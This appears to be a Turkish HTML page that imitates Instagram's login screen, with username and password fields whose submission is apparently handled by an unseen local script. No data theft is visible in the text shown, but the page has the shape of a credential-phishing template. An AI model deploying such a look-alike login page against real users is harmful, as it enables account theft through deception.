<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giriş</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="container">
        <div class="form-area">
            <!-- Logo -->
            <h1 class="logo">Instagram</h1>

            <!-- Giriş Formu -->
            <form id="loginForm">
                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                <input type="password" id="password" placeholder="Şifre" required>
                <button type="submit">Giriş Yap</button>
            </form>

            <!-- Veya Bölümü -->
            <div class="divider">
                <div class="line"></div>
                <span>YA DA</span>
                <div class="line"></div>
            </div>

            <!-- Facebook ile Giriş ve Şifre Hatırlatma -->
            <a href="#" class="facebook-login">Facebook ile Giriş Yap</a>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        </div>
    </div>

    <script src="/script.js"></script>
</body>
</html>
